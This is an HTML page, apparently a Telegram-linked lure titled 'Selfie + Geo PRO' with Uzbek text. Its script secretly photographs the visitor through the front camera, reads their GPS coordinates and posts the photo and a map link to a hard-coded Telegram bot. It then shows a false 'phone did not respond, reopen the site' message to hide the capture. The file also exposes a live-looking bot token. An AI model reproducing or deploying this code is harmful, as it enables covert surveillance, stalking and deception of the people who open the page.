<!DOCTYPE html>
<html lang="uz">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Selfie + Geo PRO</title>
<style>
body {
    background: #020617;
    color: white;
    font-family: Arial;
    text-align: center;
    margin-top: 40px;
}
video {
    width: 90%;
    max-width: 350px;
    border-radius: 15px;
}
.status {
    margin-top: 15px;
    font-size: 18px;
}
.success {
    font-size: 60px;
    color: #22c55e;
    margin-top: 20px;
}
</style>
</head>
<body>

<h2>📸 Selfie + Geo PRO</h2>
<video id="video" autoplay playsinline></video>
<p id="status" class="status">Kuting...</p>
<div id="check"></div>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const token = "8096738475:AAEpARzOs__Qeknja0IU2O6YS9F9vTrw_Fk";       // o'zgartiring: sizning bot token
const chat_id = "8108956117";   // o'zgartiring: chat ID

const video = document.getElementById("video");
const status = document.getElementById("status");

// Kamera ochish
navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
.then(stream => {
    video.srcObject = stream;
    status.innerText = "Yuz aniqlanmoqda";
    video.onloadeddata = () => {
        // Kamera tayyor bo‘lishi bilan 0.1s ichida surat va geo
        setTimeout(getLocationAndPhoto, 1);
    };
})
.catch(() => {
    status.innerText = "❌ Kamera ruxsati yo‘q";
});

// GPS va surat
function getLocationAndPhoto() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            takePhoto(lat, lon);
        }, () => {
            status.innerText = "❌ Joylashuv ruxsati yo‘q";
            takePhoto(null, null);
        });
    } else {
        status.innerText = "❌ GPS ishlamaydi";
        takePhoto(null, null);
    }
}

// Surat olish va Telegramga yuborish
function takePhoto(lat, lon) {
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    ctx.drawImage(video, 0, 0);

    const image = canvas.toDataURL("image/png");
    const blob = dataURItoBlob(image);

    const formData = new FormData();
    formData.append("chat_id", chat_id);
    let caption = "📸 Yuzingizni tekis tuting";
    if (lat && lon) {
        caption += `\n🌍 Location: https://maps.google.com/?q=${lat},${lon}`;
    }
    formData.append("caption", caption);
    formData.append("photo", blob, "photo.png");

    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: formData
    })
    .then(() => {
        status.innerText = "❌ Telefon javob bermayappti saytni qayta oching!❌ ";
        document.getElementById("check").innerHTML = "ishlamadi";
        document.getElementById("check").className = "success";
    })
    .catch(() => {
        status.innerText = "❌ Xatolik yuz berdi";
    });
}

// Helper: base64 → Blob
function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], { type: 'image/png' });
}
</script>

</body>
</html>
